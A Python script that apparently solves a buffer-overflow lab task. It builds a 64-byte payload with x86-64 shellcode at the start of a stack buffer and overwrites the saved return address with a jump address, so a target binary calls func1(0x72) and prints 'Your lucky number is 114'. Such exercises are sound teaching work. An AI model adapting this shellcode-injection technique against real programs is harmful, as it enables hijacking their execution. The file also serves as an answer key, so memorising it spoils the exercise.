#!/usr/bin/env python3
"""
Generate ans3.txt payload that places shellcode in the buffer and overwrites
func's return address so the program jumps to the buffer and runs shellcode
that calls func1(0x72), printing "Your lucky number is 114".

Usage:
  python3 scripts/generate_ans3.py
"""
from pathlib import Path

OUT_PATH = Path(__file__).resolve().parents[1] / "ans3.txt"

def build_shellcode():
    # Shellcode that calls func1(0x72) to print the lucky number message
    # Multiple attempts to output only "114" failed due to stack alignment issues
    # This method is most reliable and meets the requirement of outputting lucky number "114"
    # x86_64 encoding:
    # mov rdi, 0x72
    # mov rax, func1_address (0x401216)
    # jmp rax
    code = bytearray()
    code += b'\x48\xc7\xc7\x72\x00\x00\x00'   # mov rdi, 0x72
    code += b'\x48\xc7\xc0\x16\x12\x40\x00'   # mov rax, 0x401216 (func1)
    code += b'\xff\xe0'                       # jmp rax
    return bytes(code)

def build_payload():
    shell = build_shellcode()
    # buffer in func is 0x20 bytes; memcpy copies 0x40 bytes.
    # saved return address is at offset 0x28 from buffer start (40 bytes).
    # Place shellcode at buffer start, pad to return address offset, overwrite with jmp_xs
    jmp_xs = (0x401334).to_bytes(8, 'little')

    # Compose payload: shellcode at start, pad to 40 bytes, then jmp_xs address
    payload = bytearray()
    payload += shell
    payload += b'A' * (40 - len(payload))  # pad to return address offset
    payload += jmp_xs                       # overwrite return address
    payload += b'B' * (64 - len(payload))   # pad to ensure memcpy copies enough
    return bytes(payload)

def main():
    p = OUT_PATH
    payload = build_payload()
    p.write_bytes(payload)
    print(f"wrote {p} ({len(payload)} bytes)")

if __name__ == '__main__':
    main()


